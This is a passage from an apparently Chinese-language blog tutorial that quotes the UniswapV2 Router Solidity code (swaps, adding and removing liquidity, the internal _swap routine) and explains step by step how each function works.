UniswapV2Library.getAmountsOut(factory, amountIn, path);</span><br><span class="line">        require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]</span><br><span class="line">        );</span><br><span class="line">        _swap(amounts, path, to);</span><br><span class="line">    &#125;</span><br><span class="line">    function swapTokensForExactTokens(</span><br><span class="line">        uint amountOut,</span><br><span class="line">        uint amountInMax,</span><br><span class="line">        address[] calldata path,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;</span><br><span class="line">        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);</span><br><span class="line">        require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]</span><br><span class="line">        );</span><br><span class="line">        _swap(amounts, path, to);</span><br><span class="line">    &#125;</span><br><span class="line">    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)</span><br><span class="line">        external</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        payable</span><br><span class="line">        ensure(deadline)</span><br><span class="line">        returns (uint[] memory amounts)</span><br><span class="line">    &#123;</span><br><span class="line">        require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);</span><br><span class="line">        require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();</span><br><span class="line">        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));</span><br><span class="line">        _swap(amounts, path, to);</span><br><span class="line">    &#125;</span><br><span class="line">    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)</span><br><span class="line">        external</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        ensure(deadline)</span><br><span class="line">        returns (uint[] memory amounts)</span><br><span class="line">    &#123;</span><br><span class="line">        require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);</span><br><span class="line">        require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]</span><br><span class="line">        );</span><br><span class="line">        _swap(amounts, path, address(this));</span><br><span class="line">        IWETH(WETH).withdraw(amounts[amounts.length - 1]);</span><br><span class="line">        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);</span><br><span class="line">    &#125;</span><br><span class="line">    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)</span><br><span class="line">        external</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        ensure(deadline)</span><br><span class="line">        returns (uint[] memory amounts)</span><br><span class="line">    &#123;</span><br><span class="line">        require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);</span><br><span class="line">        require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]</span><br><span class="line">        );</span><br><span class="line">        _swap(amounts, path, address(this));</span><br><span class="line">        IWETH(WETH).withdraw(amounts[amounts.length - 1]);</span><br><span class="line">        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);</span><br><span class="line">    &#125;</span><br><span class="line">    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)</span><br><span class="line">        external</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        payable</span><br><span class="line">        ensure(deadline)</span><br><span class="line">        returns (uint[] memory amounts)</span><br><span class="line">    &#123;</span><br><span class="line">        require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);</span><br><span class="line">        require(amounts[0] &lt;= msg.value, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();</span><br><span class="line">        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));</span><br><span class="line">        _swap(amounts, path, to);</span><br><span class="line">        // refund dust eth, if any</span><br><span class="line">        if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // **** SWAP (supporting fee-on-transfer tokens) ****</span><br><span class="line">    // requires the initial amount to have already been sent to the first pair</span><br><span class="line">    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;</span><br><span class="line">        for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">            (address input, address output) = (path[i], path[i + 1]);</span><br><span class="line">            (address token0,) = UniswapV2Library.sortTokens(input, output);</span><br><span class="line">            IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));</span><br><span class="line">            uint amountInput;</span><br><span class="line">            uint amountOutput;</span><br><span class="line">            &#123; // scope to avoid stack too deep errors</span><br><span class="line">            (uint reserve0, uint reserve1,) = pair.getReserves();</span><br><span class="line">            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);</span><br><span class="line">            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);</span><br><span class="line">            amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);</span><br><span class="line">            &#125;</span><br><span class="line">            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));</span><br><span class="line">            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;</span><br><span class="line">            pair.swap(amount0Out, amount1Out, to, new bytes(0));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address[] calldata path,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external virtual override ensure(deadline) &#123;</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">        );</span><br><span class="line">        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">        _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">        require(</span><br><span class="line">            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">            &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    function swapExactETHForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address[] calldata path,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        payable</span><br><span class="line">        ensure(deadline)</span><br><span class="line">    &#123;</span><br><span class="line">        require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;);</span><br><span class="line">        uint amountIn = msg.value;</span><br><span class="line">        IWETH(WETH).deposit&#123;value: amountIn&#125;();</span><br><span class="line">        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));</span><br><span class="line">        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">        _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">        require(</span><br><span class="line">            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">            &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    function swapExactTokensForETHSupportingFeeOnTransferTokens(</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address[] calldata path,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        ensure(deadline)</span><br><span class="line">    &#123;</span><br><span class="line">        require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;);</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">        );</span><br><span class="line">        _swapSupportingFeeOnTransferTokens(path, address(this));</span><br><span class="line">        uint amountOut = IERC20(WETH).balanceOf(address(this));</span><br><span class="line">        require(amountOut &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        IWETH(WETH).withdraw(amountOut);</span><br><span class="line">        TransferHelper.safeTransferETH(to, amountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // **** LIBRARY FUNCTIONS ****</span><br><span class="line">    function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123;</span><br><span class="line">        return UniswapV2Library.quote(amountA, reserveA, reserveB);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        returns (uint amountOut)</span><br><span class="line">    &#123;</span><br><span class="line">        return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        returns (uint amountIn)</span><br><span class="line">    &#123;</span><br><span class="line">        return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAmountsOut(uint amountIn, address[] memory path)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        returns (uint[] memory amounts)</span><br><span class="line">    &#123;</span><br><span class="line">        return UniswapV2Library.getAmountsOut(factory, amountIn, path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAmountsIn(uint amountOut, address[] memory path)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        returns (uint[] memory amounts)</span><br><span class="line">    &#123;</span><br><span class="line">        return UniswapV2Library.getAmountsIn(factory, amountOut, path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h2><h2 id="addLiquidity-………"><a href="#addLiquidity-………" class="headerlink" title="_addLiquidity(……….)"></a>_addLiquidity(……….)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function _addLiquidity(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint amountADesired,</span><br><span class="line">    uint amountBDesired,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin</span><br><span class="line">) internal virtual returns (uint amountA, uint amountB) &#123;</span><br><span class="line">    // create the pair if it doesn&#x27;t exist yet</span><br><span class="line">    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;</span><br><span class="line">        IUniswapV2Factory(factory).createPair(tokenA, tokenB);</span><br><span class="line">    &#125;</span><br><span class="line">    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);</span><br><span class="line">    if (reserveA == 0 &amp;&amp; reserveB == 0) &#123;</span><br><span class="line">        (amountA, amountB) = (amountADesired, amountBDesired);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);</span><br><span class="line">        if (amountBOptimal &lt;= amountBDesired) &#123;</span><br><span class="line">            require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">            (amountA, amountB) = (amountADesired, amountBOptimal);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);</span><br><span class="line">            assert(amountAOptimal &lt;= amountADesired);</span><br><span class="line">            require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">            (amountA, amountB) = (amountAOptimal, amountBDesired);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的功能就是用来寻找最佳的tokenA,B数量</p><p>内部函数，首先会寻找tokenA,B是否有pair对，如果没有就创建pair,然后pair的获取储存金，如果储蓄金都为0那么直接返回amount(A,B)Desired。当不为0时，就会通过quote首先根据amountADesired的数量算出最佳的amountBOptimal,如果amountBOptimal&lt;amountBDesired,且amountBOptimal&gt;amountBMin(这一条不通过直接报错回滚)，那么成功返回（amountADesired,amountBOptimal）。如果BO&gt;BD的话，则根据amountBDesired算出amountAOptimal,当amountAOptimal&gt;amountAMin的话那么就返回（amountBDesired,amountAOptimal）,否则回滚。</p><h2 id="addLiquidity-……"><a href="#addLiquidity-……" class="headerlink" title="addLiquidity(……)"></a>addLiquidity(……)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function addLiquidity(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint amountADesired,</span><br><span class="line">    uint amountBDesired,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;</span><br><span class="line">    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);</span><br><span class="line">    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);</span><br><span class="line">    liquidity = IUniswapV2Pair(pair).mint(to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tokenA 和 tokenB 就是配对的两个代币，amountADesired和amountBDesired是预期准备为添加流动性付出的Token数量，amountAMin和amountBMin是用户可以接受的最小交易数量（根据滑点计算），to是LP-Token的接收地址，deadline是这笔交易的有效期，超过有效期还没有交易就会直接失效</p><p>首先调用_addLiquidity(…..）来寻找到最佳的tokenA,B数量，然后转账（转账前必须授权Router合约，因为他用的是transferFrom来转账的），最后调用pair合约的mint（to）来完成添加流动性</p><h2 id="addLiquidityETH-……"><a href="#addLiquidityETH-……" class="headerlink" title="addLiquidityETH(…….)"></a>addLiquidityETH(…….)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function addLiquidityETH(</span><br><span class="line">    address token,</span><br><span class="line">    uint amountTokenDesired,</span><br><span class="line">    uint amountTokenMin,</span><br><span class="line">    uint amountETHMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123;</span><br><span class="line">    (amountToken, amountETH) = _addLiquidity(</span><br><span class="line">        token,</span><br><span class="line">        WETH,</span><br><span class="line">        amountTokenDesired,</span><br><span class="line">        msg.value,</span><br><span class="line">        amountTokenMin,</span><br><span class="line">        amountETHMin</span><br><span class="line">    );</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, token, WETH);</span><br><span class="line">    TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);</span><br><span class="line">    IWETH(WETH).deposit&#123;value: amountETH&#125;();</span><br><span class="line">    assert(IWETH(WETH).transfer(pair, amountETH));</span><br><span class="line">    liquidity = IUniswapV2Pair(pair).mint(to);</span><br><span class="line">    // refund dust eth, if any</span><br><span class="line">    if (msg.value &gt; amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用来添加流动性</p><p>用token与weth进行铸造流动性</p><p>首先也是通过_addLiquidity(……….)来寻找到最佳的数量，其中weth的数量是msg.value,找到最佳之后转账token代币，然后Router合约会储存相应的eth到weth，然后转给pair合约，然后调用mint(to)进行铸造流动性，最后将多余的msg.value返还给调用者</p><h2 id="RemoveLiquidity"><a href="#RemoveLiquidity" class="headerlink" title="RemoveLiquidity"></a>RemoveLiquidity</h2><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">function removeLiquidity(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair</span><br><span class="line">    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);</span><br><span class="line">    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);</span><br><span class="line">    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);</span><br><span class="line">    require(amountA &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">    require(amountB &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function removeLiquidityETH(</span><br><span class="line">    address token,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountTokenMin,</span><br><span class="line">    uint amountETHMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123;</span><br><span class="line">    (amountToken, amountETH) = removeLiquidity(</span><br><span class="line">        token,</span><br><span class="line">        WETH,</span><br><span class="line">        liquidity,</span><br><span class="line">        amountTokenMin,</span><br><span class="line">        amountETHMin,</span><br><span class="line">        address(this),</span><br><span class="line">        deadline</span><br><span class="line">    );</span><br><span class="line">    TransferHelper.safeTransfer(token, to, amountToken);</span><br><span class="line">    IWETH(WETH).withdraw(amountETH);</span><br><span class="line">    TransferHelper.safeTransferETH(to, amountETH);</span><br><span class="line">&#125;</span><br><span class="line">function removeLiquidityWithPermit(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline,</span><br><span class="line">    bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">) external virtual override returns (uint amountA, uint amountB) &#123;</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">    uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);</span><br><span class="line">&#125;</span><br><span class="line">function removeLiquidityETHWithPermit(</span><br><span class="line">    address token,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountTokenMin,</span><br><span class="line">    uint amountETHMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline,</span><br><span class="line">    bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">) external virtual override returns (uint amountToken, uint amountETH) &#123;</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, token, WETH);</span><br><span class="line">    uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">    (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****</span><br><span class="line">function removeLiquidityETHSupportingFeeOnTransferTokens(</span><br><span class="line">    address token,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountTokenMin,</span><br><span class="line">    uint amountETHMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) public virtual override ensure(deadline) returns (uint amountETH) &#123;</span><br><span class="line">    (, amountETH) = removeLiquidity(</span><br><span class="line">        token,</span><br><span class="line">        WETH,</span><br><span class="line">        liquidity,</span><br><span class="line">        amountTokenMin,</span><br><span class="line">        amountETHMin,</span><br><span class="line">        address(this),</span><br><span class="line">        deadline</span><br><span class="line">    );</span><br><span class="line">    TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));</span><br><span class="line">    IWETH(WETH).withdraw(amountETH);</span><br><span class="line">    TransferHelper.safeTransferETH(to, amountETH);</span><br><span class="line">&#125;</span><br><span class="line">function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(</span><br><span class="line">    address token,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountTokenMin,</span><br><span class="line">    uint amountETHMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline,</span><br><span class="line">    bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">) external virtual override returns (uint amountETH) &#123;</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, token, WETH);</span><br><span class="line">    uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">    amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(</span><br><span class="line">        token, liquidity, amountTokenMin, amountETHMin, to, deadline</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-4"><a href="#Analyse-4" class="headerlink" title="Analyse"></a>Analyse</h3><p>多种remove方法removeLiquidity对应着addLiquidity(……)，将lptoken销毁，然后得到相应的token0,1</p><h2 id="swap-………"><a href="#swap-………" class="headerlink" title="_swap(………)"></a>_swap(………)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;</span><br><span class="line">        for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">            (address input, address output) = (path[i], path[i + 1]);</span><br><span class="line">            (address token0,) = UniswapV2Library.sortTokens(input, output);</span><br><span class="line">            uint amountOut = amounts[i + 1];</span><br><span class="line">            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));</span><br><span class="line">            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;</span><br><span class="line">            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(</span><br><span class="line">                amount0Out, amount1Out, to, new bytes(0)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>遍历整个兑换路径，path[i]为inp Token，path[i+1]为output Token，在进行amount的匹配，判断是否为最后一次兑换，是则to为为_to，否则to为下一个兑换匹配的pair合约地址，最后调用pair合约下的swap函数实现兑换</p><h2 id="其他方式的swap"><a href="#其他方式的swap" class="headerlink" title="其他方式的swap"></a>其他方式的swap</h2><ul><li><p>swapExactTokensForTokens：用指定数量的TokenA兑换未确定数量的TokenB</p></li><li><p>swapTokensForExactTokens：用未确定数量的TokenA换取确定数量的TokenB</p></li><li><p>swapExactETHForTokens：用指定数量的的ETH兑换ERC20 